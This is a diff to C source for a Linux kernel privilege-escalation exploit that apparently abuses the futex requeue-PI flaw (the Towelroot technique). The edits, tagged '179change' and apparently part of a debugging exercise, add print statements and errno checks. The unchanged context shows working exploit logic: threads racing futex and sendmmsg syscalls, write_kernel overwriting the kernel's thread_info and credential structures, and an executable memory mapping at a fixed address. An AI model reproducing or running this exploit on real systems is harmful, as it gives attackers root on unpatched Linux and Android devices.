@@ -169,6 +169,8 @@ ssize_t write_pipe(void *readbuf, void *writebuf, size_t count) {
 
 void write_kernel(int signum)
 {
+    //179change print 
+    printf("wrie kernel fucntion\n");
 	struct thread_info stackbuf;
 	unsigned long taskbuf[0x100];
 	struct cred *cred;
@@ -289,7 +291,11 @@ void write_kernel(int signum)
 	write_pipe(cred, &credbuf, sizeof credbuf);
 
 	pid = syscall(__NR_gettid);
-
+    //179change error check 
+    if (pid < 0) {
+       int errsv = errno;
+       printf("__NR_gettid, %d, line, %d\n", errsv, __LINE__); 
+    }
 	for (i = 0; i < ARRAY_SIZE(taskbuf); i++) {
 		static unsigned long write_value = 1;
 
@@ -355,11 +361,20 @@ void *make_action(void *arg) {
 	int ret;
 
 	prio = (int)arg;
+    //179chnage
+    printf("make action, %d\n", prio);
 	last_tid = syscall(__NR_gettid);
+    //179change error check
+    if (last_tid < 0) {
+        int errsv = errno;
+        printf("__NR_gettid, %d, line, %d\n", errsv, __LINE__);
+    }
 
 	pthread_mutex_lock(&is_thread_desched_lock);
 	pthread_cond_signal(&is_thread_desched);
-
+    
+    //179change print
+    printf("write kernel pointer set\n");
 	act.sa_handler = write_kernel;
 	//179change
     //error type
@@ -381,6 +396,11 @@ void *make_action(void *arg) {
 	}
 
 	ret = syscall(__NR_futex, &uaddr2, FUTEX_LOCK_PI, 1, 0, NULL, 0);
+    //179change error check
+    if (ret < 0) {
+        int errsv = errno;
+        printf("__NR_futex, %d, line, %d\n", errsv, __LINE__);
+    }
 	printf("futex dm: %d\n", ret);
 
 	while (1) {
@@ -391,6 +411,8 @@ void *make_action(void *arg) {
 }
 
 pid_t wake_actionthread(int prio) {
+    //179change print 
+    printf("waking prio %d\n", prio);
 	pthread_t th4;
 	pid_t pid;
 	char filename[256];
@@ -450,7 +472,8 @@ pid_t wake_actionthread(int prio) {
 	}
 
 	pthread_mutex_unlock(&is_thread_desched_lock);
-
+    
+    printf("woke prio %d\n", prio);
 	return pid;
 }
 
@@ -494,6 +517,11 @@ void *send_magicmsg(void *arg) {
 	int ret;
 
 	waiter_thread_tid = syscall(__NR_gettid);
+    //179change error check
+    if (waiter_thread_tid < 0) {
+        int errsv = errno;
+        printf("__NR_gettid, %d, line, %d\n", errsv, __LINE__);
+    }
 	setpriority(PRIO_PROCESS, 0, 12);
 
 	sockfd = make_socket();
@@ -516,9 +544,14 @@ void *send_magicmsg(void *arg) {
 	msgvec[0].msg_hdr.msg_flags = 0;
 	msgvec[0].msg_len = 0;
 
-	syscall(__NR_futex, &uaddr1, FUTEX_WAIT_REQUEUE_PI, 0, 0, &uaddr2, 0);
-
-	do_socket_tid_read = 1;
+    //179 change set ret
+	//syscall(__NR_futex, &uaddr1, FUTEX_WAIT_REQUEUE_PI, 0, 0, &uaddr2, 0);
+	ret = syscall(__NR_futex, &uaddr1, FUTEX_WAIT_REQUEUE_PI, 0, 0, &uaddr2, 0);
+	if (ret < 0) {
+        int errsv = errno;
+        printf("__NR_futex, %d, line, %d\n", errsv, __LINE__);
+    }
+    do_socket_tid_read = 1;
 
 	while (1) {
 		if (did_socket_tid_read != 0) {
@@ -531,9 +564,6 @@ void *send_magicmsg(void *arg) {
 	while (1) {
 		ret = syscall(__NR_sendmmsg, sockfd, msgvec, 1, 0);
 		if (ret <= 0) {
-            //179change
-            //prints error
-            printf("sendmmsg");
 			break;
 		}
 	}
@@ -574,9 +604,10 @@ void *search_goodnum(void *arg) {
 	char buf[0x1000];
     
     //179change print 
-    printf("futex_lock_pi \n");
-	syscall(__NR_futex, &uaddr2, FUTEX_LOCK_PI, 1, 0, NULL, 0);
-
+    printf("thread goodnum futex_lock_pi \n");
+	//179change set ret error check
+    //syscall(__NR_futex, &uaddr2, FUTEX_LOCK_PI, 1, 0, NULL, 0);
+    ret = syscall(__NR_futex, &uaddr2, FUTEX_LOCK_PI, 1, 0, NULL, 0);
 	while (1) {
 		ret = syscall(__NR_futex, &uaddr1, FUTEX_CMP_REQUEUE_PI, 1, 0, &uaddr2, uaddr1);
 		if (ret == 1) {
@@ -587,14 +618,21 @@ void *search_goodnum(void *arg) {
 
 	wake_actionthread(6);
 	wake_actionthread(7);
+    //179change comment
+    printf("search_goodnum, wake_action 6,7 done\n");
 
 	uaddr2 = 0;
 	do_socket_tid_read = 0;
 	did_socket_tid_read = 0;
-
-	syscall(__NR_futex, &uaddr2, FUTEX_CMP_REQUEUE_PI, 1, 0, &uaddr2, uaddr2);
-
-	while (1) {
+    
+    //179change set ret error check
+	//syscall(__NR_futex, &uaddr2, FUTEX_CMP_REQUEUE_PI, 1, 0, &uaddr2, uaddr2);
+	ret = syscall(__NR_futex, &uaddr2, FUTEX_CMP_REQUEUE_PI, 1, 0, &uaddr2, uaddr2);
+	if (ret < 0) {
+        int errsv = errno;
+        printf("__NR_futex, %d, line, %d\n", errsv, __LINE__);
+    }
+    while (1) {
 		if (do_socket_tid_read != 0) {
 			break;
 		}
@@ -642,8 +680,10 @@ void *search_goodnum(void *arg) {
 	setup_exploit(MAGIC);
 
 	magicval = *((unsigned long *)MAGIC);
-
-	wake_actionthread(11);
+    
+    wake_actionthread(11);
+    //179change
+    printf("good numgood num woke thread 11");
 
 	if (*((unsigned long *)MAGIC) == magicval) {
 		printf("using MAGIC_ALT.\n");
@@ -793,7 +833,9 @@ void init_exploit() {
 	pthread_t th1, th2, th3;
 
 	printf("running with pid %d\n", getpid());
-
+    
+    //179change print
+    printf("accepting socket\n");
 	pthread_create(&th1, NULL, accept_socket, NULL);
 
 	addr = (unsigned long)mmap((void *)0xa0000000, 0x110000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
@@ -815,7 +857,8 @@ void init_exploit() {
 			sleep(10);
 		}
 	}
-    
+    //179change print
+    printf("starting exploit\n");
 	pthread_mutex_lock(&done_lock);
 	pthread_create(&th2, NULL, search_goodnum, NULL);
 	pthread_create(&th3, NULL, send_magicmsg, NULL);
